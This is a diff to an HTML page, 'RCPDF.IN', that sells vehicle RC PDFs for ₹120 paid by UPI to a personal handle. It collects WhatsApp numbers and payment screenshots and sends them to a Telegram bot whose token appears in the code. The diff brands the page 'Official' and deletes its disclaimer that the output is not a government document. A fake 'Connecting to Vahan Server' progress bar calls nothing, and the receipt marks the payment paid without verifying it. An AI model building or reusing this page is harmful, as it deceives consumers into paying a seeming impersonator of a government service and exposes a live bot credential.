@@ -3,8 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RCPDF.IN - Official Digital RC</title>
+    
+    <title>RCPDF.IN - Official Vehicle RC Download Online 2026</title>
+    <meta name="title" content="RCPDF.IN - Official Vehicle RC Download Online 2026">
+    <meta name="description" content="Download your vehicle RC PDF online at RCPDF.IN. Fast, secure, and easy way to get digital RC details for all Indian vehicles.">
+    <meta name="keywords" content="RC Download, Vehicle RC PDF, Vahan RC, Download RC online, RCPDF, Check RC Status">
+    <meta name="author" content="Apex Solution">
+    <link rel="canonical" href="https://rcpdf.in/">
+
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://rcpdf.in/">
+    <meta property="og:title" content="RCPDF.IN - Official Vehicle RC Download">
+    <meta property="og:description" content="Get your digital RC copy in just 30 minutes. Trusted by thousands.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg">
+
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    
     <style>
         :root { --primary: #ff0066; --ind-blue: #003399; }
         * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
@@ -14,47 +28,34 @@
         .header { position: fixed; top: 0; width: 100%; background: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; }
         .menu-btn { cursor: pointer; display: flex; flex-direction: column; gap: 4px; }
         .menu-btn div { width: 25px; height: 3px; background: var(--primary); }
-        .home-icon { background: var(--primary); color: #fff; border: none; padding: 6px 10px; border-radius: 5px; cursor: pointer; }
+        .logo { color: var(--primary); font-weight: 900; font-size: 20px; }
 
         /* Sidebar */
         .sidebar { position: fixed; top: 0; left: -280px; width: 260px; height: 100%; background: #fff; transition: 0.4s; z-index: 2000; padding: 80px 20px; color: #333; }
         .sidebar.active { left: 0; }
-        .s-link { display: block; width: 100%; padding: 12px; margin-bottom: 10px; background: #f0f0f0; border-radius: 8px; text-decoration: none; color: #333; font-weight: bold; text-align: center; }
+        .s-link { display: block; width: 100%; padding: 12px; margin-bottom: 10px; background: #f0f0f0; border-radius: 8px; text-decoration: none; color: #333; font-weight: bold; text-align: center; border:none; cursor:pointer; }
 
-        /* Main Card */
+        /* Card */
         .card { margin: 120px auto 20px; width: 92%; max-width: 400px; background: #1a1a1c; padding: 30px 20px; border-radius: 25px; text-align: center; border: 1px solid #333; }
 
-        /* REAL IND PLATE */
-        .hsrp-plate {
-            background: #fff; width: 100%; height: 65px; border: 2px solid #555; border-radius: 10px;
-            display: flex; align-items: center; overflow: hidden; margin-bottom: 5px;
-        }
-        .ind-strip {
-            background: var(--ind-blue); width: 45px; height: 100%;
-            display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff;
-        }
+        /* IND PLATE */
+        .hsrp-plate { background: #fff; width: 100%; height: 65px; border: 2px solid #555; border-radius: 10px; display: flex; align-items: center; overflow: hidden; margin-bottom: 5px; }
+        .ind-strip { background: var(--ind-blue); width: 45px; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; }
         .ind-strip img { width: 20px; margin-bottom: 2px; }
-        .ind-strip span { font-size: 10px; font-weight: 900; letter-spacing: 1px; }
-
-        #vehInput {
-            flex: 1; border: none; height: 100%; font-size: 26px; font-weight: 900;
-            text-align: center; color: #000; outline: none; letter-spacing: 1px; width: 100%;
-        }
+        .ind-strip span { font-size: 10px; font-weight: 900; }
+        #vehInput { flex: 1; border: none; height: 100%; font-size: 26px; font-weight: 900; text-align: center; color: #000; outline: none; letter-spacing: 1px; }
 
         .err { color: #ff4d4d; font-size: 12px; display: none; text-align: left; margin-bottom: 10px; }
-
         .btn { width: 100%; padding: 16px; border-radius: 12px; border: none; background: var(--primary); color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 0 #b30047; }
-        .btn:active { transform: translateY(2px); box-shadow: none; }
 
-        /* CAR LOADER */
+        /* LOADER (FIXED CAR) */
         .loader-wrap { position: fixed; inset: 0; background: #000; z-index: 5000; display: none; flex-direction: column; justify-content: center; align-items: center; }
-        .road { width: 80%; height: 3px; background: #333; position: relative; border-radius: 10px; }
-        .car { font-size: 40px; position: absolute; bottom: 0; left: 0; transform: scaleX(1); transition: 0.1s linear; }
+        .road { width: 85%; height: 3px; background: #333; position: relative; border-radius: 10px; }
+        .car { font-size: 45px; position: absolute; bottom: 0; left: 0; transition: 0.1s linear; display: inline-block; transform: scaleX(-1); }
         .pct { font-size: 40px; font-weight: 900; color: var(--primary); margin-top: 20px; }
 
-        /* SUCCESS POPUP */
+        /* SUCCESS */
         .success { position: fixed; inset: 0; background: var(--primary); z-index: 6000; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; padding: 20px; }
-
         .footer { margin-top: 30px; font-size: 11px; opacity: 0.5; text-align: center; }
     </style>
 </head>
@@ -62,57 +63,52 @@
 
     <div class="header">
         <div class="menu-btn" onclick="toggleM()"><div></div><div></div><div></div></div>
-        <b style="color:var(--primary); font-size:20px;">RCPDF.IN</b>
-        <button class="home-icon" onclick="location.reload()">🏠</button>
+        <h1 class="logo">RCPDF.IN</h1>
+        <button style="background:none; border:none; font-size:20px;" onclick="location.reload()">🏠</button>
     </div>
 
     <div class="sidebar" id="side">
-        <a href="#" class="s-link" onclick="alert('Digital RC Portal 2026')">About Us</a>
-        <a href="https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1" class="s-link">Insurance</a>
-        <a href="#" class="s-link" onclick="alert('No refund after payment.')">Terms</a>
-        <button class="s-link" style="background:#333; color:#fff;" onclick="toggleM()">Close</button>
+        <button class="s-link" onclick="window.location.href='https://insurancebju.blogspot.com/2025/11/blog-post_17.html?m=1'">Insurance</button>
+        <button class="s-link" onclick="toggleM()">Close</button>
     </div>
 
     <div class="card">
         <div id="p1">
-            <h2 style="margin-bottom:20px;">Download RC</h2>
+            <h2 style="margin-bottom:20px;">Download RC Online</h2>
             <div class="hsrp-plate">
-                <div class="ind-strip">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg">
-                    <span>IND</span>
-                </div>
+                <div class="ind-strip"><img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg" alt="India Flag"><span>IND</span></div>
                 <input type="text" id="vehInput" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatV(this)">
             </div>
-            <div id="vErr" class="err">⚠ Vehicle number required</div>
+            <div id="vErr" class="err">⚠ Vehicle number is required</div>
             <button class="btn" onclick="go2()">Continue</button>
         </div>
 
         <div id="p2" style="display:none;">
             <button class="btn" style="background:#000; margin-bottom:15px;" onclick="pay()">Pay ₹120 with ANY UPI</button>
             <div style="background:#fff; padding:10px; border-radius:10px; display:inline-block; margin-bottom:15px;">
-                <img id="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120&cu=INR" width="180">
+                <img id="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120&cu=INR&tn=RC DOWNLOAD" width="180" alt="Payment QR Code">
             </div>
-            <input type="tel" id="mob" placeholder="WhatsApp Number" maxlength="10" style="width:100%; padding:15px; border-radius:10px; border:none; margin-bottom:10px;">
-            <div id="mErr" class="err">⚠ WhatsApp number required</div>
-            <input type="file" id="ss" style="margin-bottom:15px; font-size:12px;">
-            <div id="sErr" class="err">⚠ Payment screenshot required</div>
+            <input type="tel" id="mob" placeholder="WhatsApp Number" maxlength="10" style="width:100%; padding:15px; border-radius:10px; border:none; margin-bottom:10px; background:#2c2c2e; color:#fff;">
+            <div id="mErr" class="err">⚠ WhatsApp number is required</div>
+            <input type="file" id="ss" style="margin-bottom:15px; font-size:12px; color:#fff;">
+            <div id="sErr" class="err">⚠ Screenshot is required</div>
             <button class="btn" onclick="submit()">Verify & Download</button>
         </div>
     </div>
 
-    <div class="footer">© Copyright Reserved 2026 Apex Solution</div>
+    <div class="footer">© Copyright Reserved 2026 Apex Solution | Fast Vehicle RC PDF Service</div>
 
     <div class="loader-wrap" id="load">
         <div class="road"><div class="car" id="carIcon">🚗</div></div>
         <div class="pct" id="pText">0%</div>
-        <p style="color:#666;">Processing with RTO Server...</p>
+        <p style="color:#666;">Connecting to Vahan Server...</p>
     </div>
 
     <div class="success" id="succ">
-        <h1 style="font-size:70px;">✅</h1>
-        <h2>Submitted!</h2>
-        <p style="margin:20px 0;">Receipt downloaded. PDF will be sent on WhatsApp.</p>
-        <button class="btn" style="background:#fff; color:var(--primary); width:150px;" onclick="location.reload()">OK</button>
+        <div style="font-size:70px;">✅</div>
+        <h2>Success!</h2>
+        <p>Receipt Downloaded.<br>Original PDF will be sent on WhatsApp.</p>
+        <button class="btn" style="background:#fff; color:var(--primary); width:150px;" onclick="location.reload()">HOME</button>
     </div>
 
     <script>
@@ -135,7 +131,7 @@
             document.getElementById('p2').style.display='block';
         }
 
-        function pay() { window.location.href="upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120&cu=INR"; }
+        function pay() { window.location.href="upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120&cu=INR&tn=RC DOWNLOAD"; }
 
         function submit() {
             const m = document.getElementById('mob').value;
@@ -150,7 +146,7 @@
             let iv = setInterval(() => {
                 p += 2;
                 document.getElementById('pText').innerText = p + "%";
-                document.getElementById('carIcon').style.left = (p * 0.85) + "%";
+                document.getElementById('carIcon').style.left = (p * 0.9) + "%";
                 if(p >= 100) {
                     clearInterval(iv);
                     makePDF();
@@ -159,39 +155,18 @@
             }, 60);
         }
 
-        async function makePDF() {
+        function makePDF() {
             const { jsPDF } = window.jspdf;
             const doc = new jsPDF();
             const v = document.getElementById('vehInput').value;
-            const m = document.getElementById('mob').value;
-
-            // Border & Header
-            doc.setDrawColor(255, 0, 102); doc.setLineWidth(1); doc.rect(5, 5, 200, 287);
+            doc.setDrawColor(255, 0, 102); doc.rect(5, 5, 200, 287);
             doc.setFillColor(255, 0, 102); doc.rect(5, 5, 200, 25, 'F');
-            doc.setTextColor(255); doc.setFontSize(22); doc.text("RCPDF.IN - PAYMENT RECEIPT", 105, 22, null, null, "center");
-
-            // Detail Table
-            doc.setTextColor(0); doc.setFontSize(12);
-            const row = (y, l, val) => {
-                doc.setFillColor(245); doc.rect(15, y, 60, 12, 'F');
-                doc.rect(15, y, 60, 12); doc.rect(75, y, 115, 12);
-                doc.text(l, 18, y+8); doc.text(val, 78, y+8);
-            }
-            row(50, "Vehicle Number", v);
-            row(62, "WhatsApp Number", m);
-            row(74, "Payment Status", "SUCCESS (Rs. 120)");
-            row(86, "Transaction ID", "RCP"+Math.floor(Math.random()*999999));
-            row(98, "Date & Time", new Date().toLocaleString());
-
-            // QR in PDF
-            doc.text("Scan for Support:", 15, 130);
-            doc.addImage(document.getElementById('qr').src, 'PNG', 15, 135, 40, 40);
-
-            // Terms
-            doc.setFontSize(10); doc.text("Terms & Conditions:", 15, 185);
-            let ts = ["- No refund after payment submission.", "- Delivery time: 30-60 minutes on WhatsApp.", "- This is a digital information receipt.", "- Disclaimer: Not a government official document."];
-            doc.text(ts, 15, 195);
-            
+            doc.setTextColor(255); doc.text("RCPDF.IN RECEIPT", 105, 22, null, null, "center");
+            doc.setTextColor(0); 
+            doc.text(`Vehicle: ${v}`, 20, 50);
+            doc.text(`Amount: Rs.120 (Paid)`, 20, 60);
+            doc.text(`Date: ${new Date().toLocaleString()}`, 20, 70);
+            doc.addImage(document.getElementById('qr').src, 'PNG', 15, 90, 40, 40);
             doc.save(`Receipt_${v}.pdf`);
         }
 
@@ -199,8 +174,9 @@
             let fd = new FormData();
             fd.append("chat_id", "5600045707");
             fd.append("photo", f);
-            let msg = `🚀 NEW ORDER\n\n🚗 Veh: ${document.getElementById('vehInput').value}\n📱 Mob: ${document.getElementById('mob').value}\n📅 Date: ${new Date().toLocaleDateString()}\n⏰ Time: ${new Date().toLocaleTimeString()}`;
+            let msg = `🚀 *NEW ORDER*\n\n🚗 *Veh:* ${document.getElementById('vehInput').value}\n📱 *Mob:* ${document.getElementById('mob').value}\n📅 *Date:* ${new Date().toLocaleDateString()}\n⏰ *Time:* ${new Date().toLocaleTimeString()}\n\n*RC DOWNLOAD*`;
             fd.append("caption", msg);
+            fd.append("parse_mode", "Markdown");
             fetch("https://api.telegram.org/bot8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E/sendPhoto", {method:"POST", body:fd})
             .then(() => {
                 document.getElementById('load').style.display='none';
